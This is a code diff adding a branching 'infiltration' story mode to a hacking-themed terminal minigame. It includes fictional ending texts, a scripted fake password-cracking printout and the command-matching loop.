+Breach.storyEndings["end_purged"] = Breach.MakeEnding("end_purged", "good", "NOTHING TO FIND", "You wipe your own copy rather than risk it in transit. You leave with nothing to show for it — but also nothing for anyone to find.")
+Breach.storyEndings["end_flagged"] = Breach.MakeEnding("end_flagged", "bad", "FLAGGED", "The outbound monitor catches the traffic before you're clear. The backup never makes it out, and neither does your cover.")
+Breach.storyEndings["end_wait"] = Breach.MakeEnding("end_wait", "risky", "CUTTING IT CLOSE", "You sit tight until the response team stands down, then slip out through the gap. You very nearly didn't make it.")
+Breach.storyEndings["end_selfclean"] = Breach.MakeEnding("end_selfclean", "good", "GHOST PROTOCOL", "You pull your own tools off the box before you go — nothing left behind that ties back to you, old session or new.")
+Breach.storyEndings["end_watched"] = Breach.MakeEnding("end_watched", "partial", "EYES ON YOU", "You check what's watching first. Nothing catches you mid-move, but you burn enough time that somebody logs the gap later.")
+Breach.storyEndings["end_relog"] = Breach.MakeEnding("end_relog", "risky", "NEW FACE, OLD HABITS", "You dial straight out under the new identity. It holds — barely — but you never checked what you left running behind you.")
+Breach.storyEndings["end_correlated"] = Breach.MakeEnding("end_correlated", "bad", "CORRELATED", "You wait too long deciding. Someone lines the old session up against the new one.")
+Breach.storyEndings["end_proxied"] = Breach.MakeEnding("end_proxied", "risky", "BORROWED LINE", "You don't crack anything — you just bounce your own traffic through this box like a relay. It works, but now this gateway's fingerprints are on your exit too.")
+Breach.storyEndings["end_lowkey"] = Breach.MakeEnding("end_lowkey", "good", "LOW KEY", "You keep to exactly what this account can normally touch. Nothing about the session looks different from any other day.")
+Breach.storyEndings["end_overreach"] = Breach.MakeEnding("end_overreach", "risky", "OVERREACH", "You push for root on a borrowed login. It works, but it's exactly the kind of move that gets an account flagged the next time someone reviews it.")
+Breach.storyEndings["end_covered"] = Breach.MakeEnding("end_covered", "good", "NOT EVEN A TRACE", "You clean up after yourself before you're even done. Whoever owns this login will never know it was used.")
+Breach.storyEndings["end_burned"] = Breach.MakeEnding("end_burned", "bad", "BURNED", "The account gets flagged mid-session. Whatever you were doing, you're not finishing it under this name.")
+Breach.storyEndings["end_spotted"] = Breach.MakeEnding("end_spotted", "good", "SPOTTED IT FIRST", "You catch the other process watching this port before it catches you. You route around it clean.")
+Breach.storyEndings["end_scorched"] = Breach.MakeEnding("end_scorched", "risky", "SCORCHED EARTH", "You wipe the logs wholesale on your way through. Effective, but there's no subtlety left in this exit at all.")
+Breach.storyEndings["end_quietlock"] = Breach.MakeEnding("end_quietlock", "good", "QUIET LOCK", "You don't destroy anything — you just lock the log so nothing new gets written while you're still inside. Cleaner than torching it.")
+Breach.storyEndings["end_caughtinside"] = Breach.MakeEnding("end_caughtinside", "bad", "CAUGHT INSIDE", "Whatever's sharing this port finds you first.")
+Breach.storyEndings["end_rawdump"] = Breach.MakeEnding("end_rawdump", "partial", "RAW DUMP", "You scoop up the whole core file raw. It's a mess, but the vault's contents are buried in there somewhere — you'll sort it out later.")
+Breach.storyEndings["end_keyfound"] = Breach.MakeEnding("end_keyfound", "good", "SURGICAL", "You go straight for the key instead of the noise. Clean extraction, exactly what you needed, nothing extra.")
+Breach.storyEndings["end_nodump"] = Breach.MakeEnding("end_nodump", "partial", "COVER OVER LOOT", "You wipe the crash dump before anyone finds it. Smart move for your cover — bad move for actually getting anything out of this.")
+Breach.storyEndings["end_restarted"] = Breach.MakeEnding("end_restarted", "bad", "RESTARTED", "The watchdog restarts the vault process before you can pull anything from the wreckage. Whatever was in memory is gone.")
+Breach.storyEndings["end_stillwatching"] = Breach.MakeEnding("end_stillwatching", "neutral", "STILL WATCHING", "You wait to see what the responder actually does. It pokes around, finds nothing conclusive, and stands down. You didn't gain anything from the crash — but you didn't lose anything either.")
+Breach.storyEndings["end_cleansweep"] = Breach.MakeEnding("end_cleansweep", "good", "CLEAN SWEEP", "You kill the responder before it ever files a report. The crash goes down as an unexplained blip — nobody connects it to you.")
+Breach.storyEndings["end_distracted"] = Breach.MakeEnding("end_distracted", "bad", "DISTRACTED", "You go digging for something else while the responder finishes booting. It finds you mid-search.")
+Breach.storyEndings["end_noticed"] = Breach.MakeEnding("end_noticed", "bad", "NOTICED", "You don't move fast enough either way. The responder finishes its check and flags the crash straight to the vault's owner.")
+Breach.storyEndings["end_deadend"] = Breach.MakeEnding("end_deadend", "bad", "DEAD END", "Nothing here budges. You're stuck two hops from home with no way through.")
+Breach.storyEndings["end_backdoor"] = Breach.MakeEnding("end_backdoor", "good", "BACK DOOR", "You plant a throwaway account before you do anything else. However this session ends, you've got a way back in.")
+Breach.storyEndings["end_thorough"] = Breach.MakeEnding("end_thorough", "good", "NOTHING LEFT BEHIND", "You strip out anything that might tie back to this session before you go. As clean an exit as a loud crack job can get.")
+Breach.storyEndings["end_stocked"] = Breach.MakeEnding("end_stocked", "good", "STOCKED UP", "You save off a handful of stored creds before you go — clean grab, clean exit, and a few extra keys for next time.")
+Breach.storyEndings["end_greedy"] = Breach.MakeEnding("end_greedy", "risky", "PUSHED YOUR LUCK", "You keep digging for more, longer than you should have. You get out with a bigger haul, but you cut it a lot closer than you needed to.")
+Breach.storyEndings["end_wasted"] = Breach.MakeEnding("end_wasted", "partial", "SECOND THOUGHTS", "You second-guess yourself and delete what you just pulled. You leave clean, but empty-handed for the trouble.")
+Breach.storyEndings["end_greedcaught"] = Breach.MakeEnding("end_greedcaught", "bad", "GREED CAUGHT UP", "You spend too long picking through stored logins. Someone notices activity on an account that should be quiet.")
+Breach.storyEndings["end_crashed"] = Breach.MakeEnding("end_crashed", "bad", "OVERKILL", "You go for one more kill to be thorough and take out PID 1 by mistake. The whole box goes down with you still on it.")
+Breach.storyEndings["end_dawdled"] = Breach.MakeEnding("end_dawdled", "bad", "DAWDLED", "You take too long weighing your options. Someone notices root's been active without a ticket.")
+Breach.storyEndings["end_lockedout"] = Breach.MakeEnding("end_lockedout", "bad", "LOCKED THE OWNER OUT", "You change the root password without thinking it through. The real admin gets locked out within the hour and comes looking immediately.")
+Breach.storyEndings["end_nuked"] = Breach.MakeEnding("end_nuked", "bad", "SCORCHED THE HOST", "You wipe the whole filesystem instead of just what you need. Thorough, and also the loudest possible way to announce a breach happened here.")
+Breach.storyEndings["end_overstayed"] = Breach.MakeEnding("end_overstayed", "bad", "OVERSTAYED", "You linger too long deciding what to do with root. The connection times out and drops you before you use any of it.")
+Breach.storyEndings["end_stranded"] = Breach.MakeEnding("end_stranded", "bad", "STRANDED", "You never find a way back out. Eventually, someone does.")
+Breach.storyEndings["end_caught"] = Breach.MakeEnding("end_caught", "bad", "CAUGHT COLD", "You hesitated. The watchdog finished its write, flagged the connection, and the segment locked down around you. Session terminated.")
+
+Breach.StoryBanner = function()
+    clear_screen
+    print(char(10))
+    print(c.purple + "<b>  ░▒▓  I N F I L T R A T I O N  ▓▒░" + c.ennd)
+    print(c.grey + "     no menu this time — figure out the move, then type it" + c.ennd)
+    print(char(10))
+end function
+
+Breach.PrintAutoroot = function()
+    print(char(10))
+    print(c.teal + "  running ar — dictionary attack via rainbow table..." + c.ennd)
+    print(c.grey + "    candidate: admin ... no match" + c.ennd)
+    print(c.grey + "    candidate: root ... no match" + c.ennd)
+    print(c.grey + "    candidate: toor ... no match" + c.ennd)
+    print(c.grey + "    candidate: sysadmin ... checking rainbow table" + c.ennd)
+    print(c.lime + "<b>  [ar] password found: sysadmin:hunter22" + c.ennd)
+    print(c.lime + "<b>  [ar] root shell acquired." + c.ennd)
+end function
+
+Breach.RunStory = function()
+    Breach.StoryBanner()
+    print(c.grey + "You're in. Nobody's holding your hand from here." + c.ennd)
+    user_input(c.grey + "press enter to jack in..." + c.ennd, false, false)
+
+    currentId = "start"
+    aborted = false
+    while Breach.storyNodes.hasIndex(currentId)
+        node = Breach.storyNodes[currentId]
+        print(char(10))
+        print(c.teal + "DOSSIER > " + c.white + node.text + c.ennd)
+        print(c.grey + "  options on hand:" + c.ennd)
+        for h in node.hints
+            print(c.grey + "   - " + c.white + h + c.ennd)
+        end for
+
+        // a miss doesn't end the run outright — you get a couple of
+        // retries at the same node before it actually falls through
+        // to node.fallback, same forgiveness BREACH gives via lives
+        attemptsLeft = 2
+        nextId = node.fallback
+        resolved = false
+        while not resolved
+            typed = user_input(c.grey + "type the command > " + c.ennd, false, false)
+            if typed == "!quit" then
+                aborted = true
+                break
+            end if
+
+            matchedCmd = ""
+            matchedOutput = null
+            matchedNext = null
+            for b in node.branches
+                if typed == b.cmd then
+                    matchedNext = b.next
+                    matchedCmd = b.cmd
+                    matchedOutput = b.output
+                end if
+            end for
+
+            if matchedNext != null then
+                if matchedOutput != null then
+                    print(char(10))
+                    for line in matchedOutput
+                        print(c.grey + "  " + line + c.ennd)
+                    end for
+                else if matchedCmd != "ar" then
+                    Breach.FakeOutput(typed)
+                end if
+                if matchedCmd == "ar" then Breach.PrintAutoroot()
+                nextId = matchedNext
+                resolved = true
+            else
+                Breach.FakeOutput(typed)
+                attemptsLeft = attemptsLeft - 1
+                if attemptsLeft >= 0 then
+                    print(c.yellow + "  that's not it — try again (" + (attemptsLeft + 1) + " attempt(s) left)" + c.ennd)
+                else
+                    resolved = true
+                end if
+            end if
+        end while
+
+        if aborted then break
+        currentId = nextId
+    end while
+
+    print(char(10))
+    Breach.Divider()
+    if aborted then
+        print(c.yellow + "<b>Jacked out early. Connection closed clean." + c.ennd)
+    else if Breach.storyEndings.hasIndex(currentId) then
+        ending = Breach.storyEndings[currentId]
+        tagCol = c.lime
+        if ending.tag == "bad" then tagCol = c.red
+        if ending.tag == "risky" then tagCol = c.yellow
+        if ending.tag == "partial" then tagCol = c.orange
+        if ending.tag == "neutral" then tagCol = c.cyan
+        print(tagCol + "<b>" + ending.title + c.ennd)
+        print(c.grey + "  " + ending.text + c.ennd)
+    end if
+    Breach.Divider()
+end function
+
+CmdGame = function(inp)
+    if inp.len > 1 and (inp[1] == "-h" or inp[1] == "--help") then
+        print(c.white + "<b>game" + c.ennd + c.grey + " — BREACH, a hacking minigame collection." + c.ennd)
+        print(c.grey + "  game            combat mode: dossier + 4 candidates, type the right one exactly (3 lives per enemy)" + c.ennd)
+        print(c.grey + "  game story      branching infiltration: no options shown, figure out the command yourself — different picks lead to different endings" + c.ennd)
+        print(c.grey + "  !quit anytime to jack out." + c.ennd)
+        return
+    end if
+
+    if inp.len > 1 and inp[1] == "story" then
+        Breach.RunStory()
+        return
+    end if
+
+    Breach.RunBreach()
+end function
+CommandTable["game"] = @CmdGame
